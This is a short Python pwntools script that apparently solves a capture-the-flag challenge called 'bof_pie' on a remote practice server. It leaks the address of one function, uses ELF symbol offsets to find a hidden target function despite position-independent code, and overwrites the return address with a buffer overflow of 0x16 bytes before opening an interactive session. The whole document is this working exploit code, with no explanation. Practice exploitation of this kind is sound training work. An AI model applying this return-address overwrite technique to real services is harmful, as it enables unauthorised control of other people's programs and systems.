#!/usr/bin/python 
from pwn import *

#p = process("./bof_pie")
p = remote("ctf.j0n9hyun.xyz", 3008)
elf = ELF("./bof_pie")
offset = elf.symbols['welcome'] - elf.symbols['j0n9hyun']

p.recvuntil("is ")
welcome = int(p.recv(10), 16)
log.info("welcome : "+hex(welcome))

j0n9hyun = welcome - offset

p.sendline('A'*(0x12 + 0x4) + p32(j0n9hyun))

p.interactive()
